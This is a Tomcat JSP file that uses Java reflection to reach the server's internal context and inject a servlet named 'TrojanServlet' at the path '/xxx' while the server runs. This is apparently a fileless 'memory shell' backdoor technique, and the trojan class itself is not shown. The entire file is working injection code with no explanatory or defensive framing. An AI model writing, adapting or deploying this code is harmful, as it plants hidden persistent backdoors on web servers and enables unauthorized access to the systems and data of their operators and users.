<%@ page import="org.apache.catalina.loader.WebappClassLoader" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="java.lang.reflect.Modifier" %>
<%@ page import="org.apache.catalina.Wrapper" %>
<%@ page import="servlet.TrojanServlet" %>
<%@ page import="org.apache.catalina.core.ApplicationServletRegistration" %><%--
  Created by IntelliJ IDEA.
  User: ellio
  Date: 4/14/2021
  Time: 9:27 AM
  To change this template use File | Settings | File Templates.
--%>
<%
    String servletName = "TrojanServlet";
    String urlPattern = "/xxx";

    ServletContext servletContext = request.getServletContext();
    Field field = servletContext.getClass().getDeclaredField("context");
    field.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) field.get(servletContext);

    field = applicationContext.getClass().getDeclaredField("context");
    field.setAccessible(true);
    Field modifiersField = Field.class.getDeclaredField("modifiers");
    modifiersField.setAccessible(true);
    modifiersField.setInt(field, field.getModifiers() & ~Modifier.FINAL);
    StandardContext standardContext = (StandardContext) field.get(applicationContext);

    if (standardContext.findChild(servletName) == null) {
        System.out.println("[+] Add Dynamic Servlet");

        Wrapper wrapper = standardContext.createWrapper();
        wrapper.setName(servletName);
        standardContext.addChild(wrapper);
        Servlet servlet = new TrojanServlet();

        wrapper.setServletClass(servlet.getClass().getName());
        wrapper.setServlet(servlet);
        ServletRegistration.Dynamic registration  = new ApplicationServletRegistration(wrapper,standardContext);
        registration.addMapping(urlPattern);

    }
%>